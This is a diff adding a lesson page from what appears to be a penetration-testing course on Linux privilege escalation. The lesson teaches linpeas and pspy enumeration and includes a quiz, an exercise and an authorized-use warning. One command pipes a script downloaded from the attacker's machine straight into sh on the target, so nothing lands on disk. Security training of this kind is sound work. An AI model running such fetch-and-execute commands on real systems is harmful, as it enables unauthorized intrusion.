@@ -1,0 +1,101 @@
+---
+title: Automated Enumeration
+module: linux-privilege-escalation
+moduleTitle: Linux Privilege Escalation
+moduleOrder: 18
+moduleIcon: ArrowUpFromLine
+order: 5
+summary: linpeas dumps everything. Learn to read only what matters.
+estimatedMinutes: 16
+objectives:
+  - Get linpeas onto a target without leaving a mess
+  - Read its color-coded output without drowning in it
+  - Use pspy to catch jobs that a static scan misses
+tags:
+  - privesc
+  - linpeas
+  - enumeration
+  - pspy
+---
+
+Doing every check by hand is slow, and on a timed box slow loses. Enumeration
+scripts run hundreds of checks in one shot: SUID binaries, sudo rights, cron
+jobs, writable paths, creds in files, kernel version, the lot. The catch is that
+`linpeas` prints thousands of lines, and a beginner scrolls past the one red flag
+that mattered. The skill is not running the script, it is reading it.
+
+## Get linpeas onto the box
+
+The cleanest way is to never touch disk. Serve the script from your attacker
+machine and pipe it straight into the target's shell.
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "cd /opt/PEASS-ng/linPEAS && python3 -m http.server 8000", comment: "serve linpeas.sh from your box" },
+  ]}
+/>
+
+<CommandCard command="curl http://10.10.14.5:8000/linpeas.sh | sh" title="user@target" explain="Pipe straight to sh so nothing lands on the target disk. Swap in the wget one-liner if curl is missing." />
+
+If outbound traffic is filtered, download it to a writable directory instead,
+usually `/tmp` or `/dev/shm`, make it executable, and run it there.
+
+## Read the colors, not every line
+
+linpeas color-codes by severity so you do not read all of it. The scheme is the
+whole point. **Red on yellow** marks a 95 percent probability privilege
+escalation vector, the stuff that usually is your way up. Red text is a
+high-value finding. Yellow alone is worth a look.
+
+<Callout type="tip" title="Jump to the wins first">
+Scroll to the red-on-yellow highlights before anything else. Then read the sudo
+section, the SUID section, and the "Interesting writable files" section. Ninety
+percent of the time your root path is in one of those four places, and you never
+had to read the other 2,000 lines.
+</Callout>
+
+Take the highlights as leads, not gospel. linpeas flags a possible kernel exploit
+by version, but it cannot know if it will crash the box, so you still confirm and
+decide. Treat the output as a prioritized to-do list, then verify each lead by
+hand with the checks from the earlier lessons.
+
+## pspy for the things a snapshot misses
+
+A one-shot scan cannot see a cron job that runs once a minute if it does not fire
+during the scan. `pspy` solves that. It watches process creation in real time
+with no root needed, so you catch cron jobs, scheduled scripts, and the exact
+commands root runs, including the arguments.
+
+<CommandCard command="./pspy64 -pf -i 1000" title="user@target" explain="Watch new processes and file events every 1000ms. Leave it running a few minutes to catch any cron job on its cycle." />
+
+<Callout type="security" title="Loud tools, authorized boxes only">
+Enumeration scripts are noisy. They spawn hundreds of processes, touch sensitive
+files, and light up any half-decent EDR. Run them only against systems you own or
+are contracted to test. On a stealth engagement, prefer targeted manual checks
+over blasting linpeas and announcing yourself.
+</Callout>
+
+<Quiz
+  id="linpeas-colors"
+  question="In linpeas output, what does a red-on-yellow highlight signal?"
+  answer={1}
+  options={[
+    "A command that failed to run",
+    "A roughly 95 percent probability privilege escalation vector, read it first",
+    "A file you are not allowed to open",
+    "Purely cosmetic formatting with no meaning",
+  ]}
+  explanation="linpeas paints its highest-confidence escalation findings red on yellow so you can jump straight to the vectors most likely to get you root."
+/>
+
+<Exercise
+  id="pspy-use"
+  prompt="You suspect a root cron job but cannot read root's crontab as a low-priv user. Which tool reveals it without root?"
+  answer="pspy"
+>
+pspy. It monitors process creation in real time without any privileges, so you
+see the cron job and its full command line the moment it runs.
+</Exercise>
+
+<Notes />
